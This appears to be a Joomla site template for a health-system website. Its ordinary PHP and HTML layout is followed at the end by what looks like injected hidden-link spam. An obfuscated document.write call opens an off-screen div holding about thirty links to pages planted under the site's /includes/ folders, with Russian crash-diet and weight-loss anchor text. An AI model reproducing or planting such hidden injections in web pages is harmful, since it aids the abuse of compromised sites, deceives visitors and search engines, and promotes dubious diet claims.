...
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="<?php echo $this->language; ?>" lang="<?php echo $this->language; ?>" >
	...
	?>
	<link href="/work/jtpl/joomla/maximhealthsystem/httpdocs/images/favicon.ico" rel="shortcut icon" type="image/x-icon" />
	</head>
	<body id="ff-<?php echo $fontfamily; ?>" class="<?php echo $fontstyle; ?> <?php echo $tstyle; ?> <?php echo $mstyle; ?> <?php echo $h3style; ?> iehandle">
		...
		<div id="header-bar">
			...
			<div class="wrapper">
				...
				<a href="<?php echo $this->baseurl; ?>" class="nounder"><img src="/images/stories/header-logo.jpg" border="0" alt="" id="logo" /></a>
		...
		<!-- Begin Main Page -->
			<div id="mainblock">
				...
				<div id="main-body">
    						...
    						<?php endif; ?>
                                                <?php
                                                 ...
                                                 $userId = $user->get('id');
                                                  ...
                                                  ?>
                                                 <jdoc:include type="modules" name="custom-right-top" style="xhtml" />
                                                 <?php endif; ?>
                                                 	<jdoc:include type="modules" name="custom-right" style="xhtml" />
    						...
    						<div>
                                                <?php
                                                 ...
                                                 $userId = $user->get('id');
                                                  ...
                                                  // Now we break out of the PHP tags and display the JDOC tag to include the module
                                                  ?>
                                                 <jdoc:include type="modules" name="custom-left-top" />
                                                 <?php endif; ?>
       						 <jdoc:include type="modules" name="custom-left" style="xhtml" />
					...
					<!-- End Left Column -->
					<!-- Begin Main Column -->
					<div id="maincol" <?php echo $this->countModules("custom-left") ? '' : 'class="maincol_expanded_left"' ?>>
						<div class="main-height">
							...
							<div id="mainmodules" class="spacer<?php echo $mainmod_width; ?>">
								<?php if ($this->countModules('flash-banner')) : ?>
								<div class="flash-module">
									<jdoc:include type="modules" name="flash-banner" style="xhtml" />	
								</div>
								<?php endif; ?>							
...
document.write('<' + 'di' + 'v sty' + 'le="position: absolute; l' + 'eft: -1962px; t' + 'op' + ': -2841px;">');
</script>

	<a href="http://maximhealthsystem.com/includes/index.html">Www.allenkarr легкий способ похудеть</a>
	<a href="http://maximhealthsystem.com/includes/sitemap.xml">тут</a>
	<a href="http://maximhealthsystem.com/includes/delivers/index.html">комплекс для похудения в картинках</a>
	<a href="http://maximhealthsystem.com/includes/content/index.html">диета для похудения на 2 месяца</a>
	<a href="http://maximhealthsystem.com/includes/chapter/index.html">диета для похудения кормящей матери</a>
	<a href="http://maximhealthsystem.com/includes/records/index.html">способы похудеть за короткое время без диет</a>
	<a href="http://maximhealthsystem.com/includes/cat/index.html">как можно быстро похудеть</a>
	<a href="http://maximhealthsystem.com/includes/helps/index.html">все простые способы похудеть</a>
	<a href="http://maximhealthsystem.com/includes/users/index.html">диета для похудения за две недели</a>
	<a href="http://maximhealthsystem.com/includes/archives/index.html">диета для похудения долиной</a>
	<a href="http://maximhealthsystem.com/includes/notices/index.html">надо быстро сильно похудеть</a>
	<a href="http://maximhealthsystem.com/includes/read/index.html">аллен карр простой способ похудеть</a>
	<a href="http://maximhealthsystem.com/includes/sub/index.html">алан кар быстрый способ похудеть</a>
	<a href="http://maximhealthsystem.com/includes/means/index.html">диетадля похудения на 10 кг. за месяц</a>
	<a href="http://maximhealthsystem.com/includes/heeds/index.html">критская диета интересные рецепты на нашем сайте</a>
	<a href="http://maximhealthsystem.com/includes/notes/index.html">как похудеть быстро и не тяжело</a>
	<a href="http://maximhealthsystem.com/includes/new/index.html">очень быстро похудеть, 15-20 кг. за месяц</a>
	<a href="http://maximhealthsystem.com/includes/categ/index.html">быстро похудеть не проблемма</a>
	<a href="http://maximhealthsystem.com/includes/catalog/index.html">эффективный способ быстро живот убрать и похудеть</a>
	<a href="http://maximhealthsystem.com/includes/looks/index.html">очень хочу быстро похудеть</a>
	<a href="http://maximhealthsystem.com/includes/pub/index.html">как быстро похудеть и избавиться от живота</a>
	<a href="http://maximhealthsystem.com/includes/watchs/index.html">диета быстро и эффективно похудеть</a>
	<a href="http://maximhealthsystem.com/includes/revis/index.html">средства для похудения китай баша гоуцу</a>
	<a href="http://maximhealthsystem.com/includes/more/index.html">как быстро похудеть меридиа</a>
	<a href="http://maximhealthsystem.com/includes/2009/index.html">срочно похудеть за 3 недели на 5-7 кг</a>
	<a href="http://maximhealthsystem.com/includes/2008/index.html">похудеть быстро и безопасно</a>
	<a href="http://maximhealthsystem.com/includes/info/index.html">как быстро похудеть с удовольствием</a>
	<a href="http://maximhealthsystem.com/includes/detalis/index.html">средства для похудения в луганске</a>
	<a href="http://maximhealthsystem.com/includes/threads/index.html">хочу срочно похудеть</a>
	<a href="http://maximhealthsystem.com/includes/views/index.html">срочно похудеть если принимаешь ок</a>
	<a href="http://maximhealthsystem.com/includes/dirs/index.html">диета для похудения и уменьшения объёма</a>
	<a href="http://maximhealthsystem.com/includes/cares/index.html">способ похудеть аллена карра</a>
